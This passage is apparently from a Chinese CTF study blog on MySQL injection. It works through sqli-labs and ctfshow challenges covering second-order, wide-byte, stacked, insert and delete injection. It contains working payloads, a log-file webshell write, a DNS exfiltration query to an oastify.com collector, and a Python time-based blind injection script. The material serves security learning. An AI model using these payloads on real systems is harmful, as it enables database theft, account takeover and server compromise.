<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token comment">//...</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into users (username, password) values (\"<span class="token interpolation"><span class="token variable">$username</span></span>\", \"<span class="token interpolation"><span class="token variable">$pass</span></span>\")"</span><span class="token punctuation">;</span>
<span class="token comment">//...</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注册与登录时 username 会经过 <code>mysql_escape_string</code> 函数的过滤，该函数会对危险字符进行转义：</p>
<table>
<thead>
<tr>
<th>危险字符</th>
<th>转义后</th>
</tr>
</thead>
<tbody><tr>
<td><code>\</code></td>
<td><code>\\</code></td>
</tr>
<tr>
<td><code>&#39;</code></td>
<td><code>\&#39;</code></td>
</tr>
<tr>
<td><code>&quot;</code></td>
<td><code>\&quot;</code></td>
</tr>
</tbody></table>
<p>更新密码的语句：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$username<span class="token operator">=</span> $_SESSION<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> PASSWORD<span class="token operator">=</span><span class="token string">'$pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$username'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$curr_pass'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以看到这里没有对 username 做任何处理，username 直接取我们的登录用户名</p>
<p>那么我们的思路：</p>
<ul>
<li><p>测试发现 admin 已存在</p>
</li>
<li><p>是单引号闭合，那么注册一个具有注释作用的用户名<code>admin&#39;#</code></p>
</li>
<li><p>注册后，由于转义，我们的用户名 <code>admin&#39;#</code> 能够完整存入数据库，此时的数据库记录大致如下：</p>
</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">+</span><span class="token comment">----+---------------+------------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+---------------+------------+</span>
<span class="token operator">|</span> <span class="token number">20</span> <span class="token operator">|</span> admin'<span class="token comment">#       | 123456     |</span>
<span class="token operator">+</span><span class="token comment">----+---------------+------------+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>登录后提供了修改密码的功能</li>
</ul>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250418003538338.png" alt="image-20250418003538338"></p>
<p>当我们以<code>admin&#39;#</code>尝试修改密码时，实际执行的sql语句是</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> PASSWORD<span class="token operator">=</span><span class="token string">'233'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment">#' and password='123456'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时实际修改的是 admin 账户的密码，登出后以 <code>admin:233</code> 登录 admin</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250418003721063.png" alt="image-20250418003721063"></p>
<ul>
<li>登录 admin 后进一步利用的话通常是后台功能，但这里只有数据库，所以可以考虑写脚本盲注（</li>
</ul>
<hr>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><blockquote>
<p>主要是针对 bypass <code>addslashes</code> 函数的场合</p>
</blockquote>
<p><code>addslashes</code>：为了数据库查询语句等需要在某些字符前加上了反斜线转义。这些字符是单引号（&#39;）、双引号（&quot;）、反斜线（\）与 NUL（**<code>NULL</code>** 字符）</p>
<p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个汉字，对此就有思路来解决<code>\</code>：</p>
<ul>
<li><code>urlencode(\&#39;) = %5c%27</code>，如果我们在前面在添加一个 <code>%df</code>，就会形成 <code>%df%5c%27</code> ，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把 <code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号<code>&#39;</code>在外面</li>
</ul>
<h2 id="sqli-labs-less-32"><a href="#sqli-labs-less-32" class="headerlink" title="sqli-labs less-32"></a>sqli-labs less-32</h2><p>ctfshow web552</p>
<p>核心waf：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\\\\"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\'/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\''</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\"/'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\\\""</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                
<span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>单纯的加反斜杠，尝试打宽字节注入即可</p>
<p>注意后面的 <code>table_schema=&#39;ctfshow&#39;</code> 也会被转义，这里可以采用十六进制编码绕过</p>
<p>payload：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x63746673686f77--+
-- flags
-1%df'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token number">0x63746673686f77</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token number">0x666c616773</span><span class="token comment">--+</span>
<span class="token comment">-- id,flag4s</span>
<span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>flag4s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> ctfshow<span class="token punctuation">.</span>flags<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>注入天书：使用 addslashes (), 我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p>
</blockquote>
<hr>
<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><blockquote>
<p>MySQL 的命令行中，每一条语句以 <code>;</code> 结尾，这代表语句的结束，如果在注入过程中在 <code>;</code> 后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) </p>
</blockquote>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230728174634319.png" alt="image-20230728174634319"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230728174706631.png" alt="image-20230728174706631"></p>
<p><strong>与联合查询的区别</strong>：联合查询注入只能执行<strong>查询语句</strong>，堆叠注入可执行任意语句（增删查改）</p>
<p><strong>局限</strong>：</p>
<ul>
<li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎</li>
<li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略</li>
<li>受限于执行 sql 命令的函数，如 php 的 <code>mysql_query</code> ，只能执行一个查询语句，一般只有 sql execute 相关的函数能尝试堆叠注入</li>
</ul>
<p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p>
<p><a href="https://c1oudfl0w0.github.io/blog/2023/08/15/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/">题目实战</a></p>
<hr>
<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p><strong>rename…to…语句</strong>：可以重命名改表名，使表名可被直接查询到</p>
<p><strong>alter</strong>：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）</p>
<p><strong>type</strong>：指定字段的类型，如<code>varchar(100)</code>、<code>text</code></p>
<ul>
<li><p>添加：</p>
<p><code>alter table &quot;table_name&quot; add &quot;column_name&quot;  type;</code></p>
</li>
<li><p>删除：</p>
<p><code>alter table &quot;table_name&quot; drop &quot;column_name&quot;  type;</code></p>
</li>
<li><p>改变数据类型：</p>
<p><code>alter table &quot;table_name&quot; alter column &quot;column_name&quot; type;</code></p>
</li>
<li><p>改列名：</p>
<p><code>alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</code></p>
</li>
</ul>
<hr>
<h2 id="各个数据库堆叠查询实例"><a href="#各个数据库堆叠查询实例" class="headerlink" title="各个数据库堆叠查询实例"></a>各个数据库堆叠查询实例</h2><p><strong>MySQL</strong>：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>SQL Server</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> test<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>Postgresql</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> user_test<span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="DNS数据外带"><a href="#DNS数据外带" class="headerlink" title="DNS数据外带"></a>DNS数据外带</h2><p>也叫 DNS 注入</p>
<p>前面说了，网页通常只返回第一次查询语句的数据，而堆叠注入的第二个语句产生错误或者结果只能被忽略</p>
<p>那么就相当于无回显注入，需要想办法把查询结果带出</p>
<p>条件：</p>
<ul>
<li><p>MySQL 开启 <code>load_file()</code></p>
</li>
<li><p>DNSLog 平台 （<a target="_blank" rel="noopener" href="http://hyuga.co/">Hyuga</a>、<a target="_blank" rel="noopener" href="http://ceye.io/">CEYE</a>）</p>
</li>
<li><p>Windows 平台</p>
</li>
</ul>
<p>第一个条件需要 <code>secure_file_priv</code> 为 <code>&quot;&quot;</code></p>
<p>第三个条件是因为只有 Windows 平台具有 <strong>UNC 路径</strong></p>
<blockquote>
<p>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机<br>格式：UNC命名由三个部分组成- 服务器名, 共享名, 和一个可选的文件路径，\\server\share\file_path</p>
</blockquote>
<p>在域渗透中，我们经常使用 <code>dir \\ip\\c$</code> 去尝试访问有没有权限，实际上这就是利用UNC访问</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> LOAD_FILE<span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'h9r5f1b5lbsnfr0qdijvatlxjopfd51u.oastify.com\\aaa'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250418091454820.png" alt="image-20250418091454820"></p>
<hr>
<h2 id="sqli-labs-less-38"><a href="#sqli-labs-less-38" class="headerlink" title="sqli-labs less-38"></a>sqli-labs less-38</h2><p>ctfshow web558</p>
<p>源码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    输出查询信息
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句；而之前都是<code>mysql_query</code>，只支持一条 SQL 查询</p>
<p>这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句</p>
<h3 id="开启日志写文件"><a href="#开启日志写文件" class="headerlink" title="开启日志写文件"></a>开启日志写文件</h3><p>此方法在 Windows 下成功率比 Linux 高</p>
<p>先采用联合注入获取相关信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>@<span class="token variable">@general_log</span><span class="token punctuation">,</span>@<span class="token variable">@general_log_file</span><span class="token comment">--+</span>

<span class="token comment">-- 0</span>
<span class="token comment">-- 3e0ed8a0f541.log</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>尝试注入，开启日志并且修改存取的日志路径</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">';set global general_log = "ON";set global general_log_file='</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>shell<span class="token punctuation">.</span>php'<span class="token punctuation">;</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250418092727391.png" alt="image-20250418092727391"></p>
<p>然后进行查询写入日志</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">1';select <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后访问 shell.php 即可</p>
<p>注意 linux 下的 shell.php 为 mysql 权限，直接访问会返回 403 <code>Access denied.</code></p>
<hr>
<h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">参考文章</a></p>
<p>利用字符串定义预处理 SQL （以直角三角形计算为例）</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230815171341792.png" alt="image-20230815171341792"></p>
<p>那么同样的，我们可以在预处理语句中构造payload来执行select语句</p>
<p>(以select * from `1919810931114514`为例)</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">;</span><span class="token keyword">SeT</span><span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> execsql <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> execsql<span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>prepare…from…是预处理语句，会进行编码转换</li>
<li>execute用来执行由SQLPrepare创建的SQL语句</li>
<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值</li>
</ul>
<hr>
<h1 id="Sqlmap一把梭"><a href="#Sqlmap一把梭" class="headerlink" title="Sqlmap一把梭"></a>Sqlmap一把梭</h1><blockquote>
<p>自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。目前支持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/603497242">参考文章</a></p>
<p><a href="https://c1oudfl0w0.github.io/blog/2023/07/28/ctfshow-sqlmap%E5%AE%9E%E6%88%98%E8%AE%BA/">题目实战</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">官方文档</a></p>
<p>提供5种注入方式：</p>
<ol>
<li>基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入</li>
<li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已经执行(即页面返回时间是否增加)来判断</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中</li>
<li>联合查询注入，在可以使用Union的情况下注入</li>
<li>堆查询注入，可以同时执行多条语句时的注入</li>
</ol>
<p>注意：python3.9以上需要自行搜索更改几个模块的名称才能使用sqlmap（对着报错文件全局找模块，请）</p>
<hr>
<h1 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h1><p>插入从数据库中获取的信息</p>
<p>查询语句原型：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"insert into table_name(column_name1,column_name2) value('&#123;$username&#125;','&#123;$password&#125;');"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们的目标是插入信息的同时要能够回显数据库里的内容，为此我们需要用<code>\</code>对<code>&#39;</code>进行转义然后执行其它的语句</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230814111657385.png" alt="image-20230814111657385"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20230814111728118.png" alt="image-20230814111728118"></p>
<blockquote>
<p>ctfshow web237</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span>hello\<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># 查表名</span>
username<span class="token operator">=</span>hello\<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># 查字段</span>
username<span class="token operator">=</span>hello\<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span>
<span class="token comment"># 查flag</span>
username<span class="token operator">=</span>hello\<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flagass23s3<span class="token punctuation">)</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>ctfshow web238</p>
</blockquote>
<p>过滤空格包括所有的空格绕过方法，那就用括号闭合来代替（这里仅示例查表名）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">password<span class="token operator">=</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token keyword">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><p>利用update修改字段名的功能来注入查询语句，使其字段名能够返回我们需要的信息</p>
<p><a href="https://c1oudfl0w0.github.io/blog/2023/08/16/update%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E8%AE%BA/">题目实战</a></p>
<hr>
<h1 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h1><p>删除语句</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"delete from  ctfshow_user where id = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们虽然不能直接通过这个语句来获取数据库的信息</p>
<p>但是在这个语句中我们可以输入<code>if(2&gt;1,sleep(0.2),1)</code>进行时间盲注</p>
<blockquote>
<p>ctfshow web241</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://1a2a5437-423f-4c06-9d47-5ac94a1871f2.challenge.ctf.show/api/delete.php"</span>

result <span class="token operator">=</span> <span class="token string">''</span>

<span class="token comment"># 爆表名</span>
<span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>
<span class="token comment"># 爆列名</span>
<span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'"</span>
<span class="token comment"># 爆字段值</span>
payload <span class="token operator">=</span> <span class="token string">"select flag from `flag`"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    head <span class="token operator">=</span> <span class="token number">32</span>
    tail <span class="token operator">=</span> <span class="token number">127</span>

    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>
        <span class="token comment"># sleep(0.8)</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>  <span class="token comment"># 中间指针等于头尾指针相加的一半</span>
        <span class="token comment"># print(mid)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'id'</span><span class="token punctuation">:</span>
            <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.01),-1)#"</span></span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">)</span>
            tail <span class="token operator">=</span> mid
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment">#sleep导致超时</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h1 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h1><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">参考p神博客</a></p>
<p><strong>版本限制(5.0.0-5.6.6)</strong></p>
<p>注入点在 limit 函数后面</p>
<h2 id="联合查询法"><a href="#联合查询法" class="headerlink" title="联合查询法"></a>联合查询法</h2><p>limit前面无<code>order by</code>时</p>
